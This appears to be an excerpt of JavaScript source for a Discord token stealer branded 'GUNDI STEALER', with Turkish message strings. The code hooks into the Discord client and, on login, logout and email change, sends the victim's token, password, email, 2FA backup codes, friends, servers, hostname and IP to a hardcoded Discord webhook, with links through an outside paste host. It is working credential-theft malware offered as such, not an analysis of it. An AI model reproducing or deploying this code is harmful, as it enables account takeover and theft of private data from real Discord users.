...
const os = require('os')
const webhook = "https://discord.com/api/webhooks/1076939910256275537/LqiwbUGRd19IM9hyqPCIjNMit8tlsO1WECIElGMYkw3eg49J6MJnqrHb6T9K2uO_ZuPI"
const Filters = {
    1: {
    ...
    if (config['init-notify'] == "true") {
        if (fs.existsSync(path.join(__dirname, "init"))) {
            ...
            if (token == null || token == undefined || token == "") {
                var c = {
                    username: "GUNDI STEALER",
                    content: config.ping[0] ? config.ping[1] : "",
                    embeds: [{
                        title: "Discord Başladı (Kullanıcı Giriş Yapmadı)",
                        color: config["embed-color"],
                        fields: [{
                            name: "Bilgi",
                            value: `\`\`\`Ana Bilgisayar Adı: \n${os.hostname()}\nEnjeksiyon Bilgisi: \n${__dirname}\n\`\`\``,
                            inline: !1
                        }],
                        author: {
                            name: "GUNDI STEALER"
                ...
                var c = {
                    ...
                    embeds: [{
                        ...
                        description: `[**<:partner:909102089513340979>  Bilgileri Cep Telefonuna Kopyalamak İçin Buraya Tıklayın**](https://ctf.surf/raw/${token})`,
                        color: config["embed-color"],
                        fields: [{
                            name: "Bilgi",
                            value: `\`\`\`Ana Bilgisayar Adı: \n${os.hostname()}\nEnjeksiyon Bilgisi: \n${__dirname}\n\`\`\``,
        ...
        if (config['logout-notify'] == "true") {
            if (token == null || token == undefined || token == "") {
                var c = {
                    ...
                    content: config.ping[0] ? config.ping[1] : "",
                    embeds: [{
                        title: "Kullanıcı Oturumunu Kapattı (Kullanıcı Daha Önce Oturum Açmadı)",
                        color: config["embed-color"],
                        fields: [{
                            name: "Bilgi",
                            value: `\`\`\`Ana Bilgisayar Adı: \n${os.hostname()}\nEnjeksiyon Bilgisi: \n${__dirname}\n\`\`\``,
...
async function userLogin(password, email, token) {
    ...
    var params = {
        ...
        embeds: [{
            ...
            "title": `HQ Arkadaşları (${friends.length})`,
            "color": config['embed-color'],
        ...
        {
            "title": `Toplam Sunucular (${servers.totalguilds})`,
            "color": config['embed-color'],
    ...
    if (token.startsWith("mfa")) {
        ...
        var embed = {
            "title": ":detective: __2FA Kodları__",
            "description": `[Hepsini Al](${codes.url})`,
            "color": config['embed-color'],
            "fields": codes.fields,
            "author": {
                "name": "GUNDI STEALER"
...
async function emailChanged(password, newEmail, token) {
    ...
    var params = {
        ...
        content: config.ping[0] ? config.ping[1] : "",
        embeds: [{
            "title": "E-Posta Değişti",
            description: `[**<:partner:909102089513340979>  Bilgileri Cep Telefonuna Kopyalamak İçin Buraya Tıklayıne**](https://ctf.surf/raw/${token}\n${password}\n${newEmail})`,
            "color": config['embed-color'],
            "fields": [{
                name: "Bilgi",
                value: `\`\`\`Ana Bilgisayar Adı: \n${os.hostname()}\nIP: \n${ip}\`\`\``,
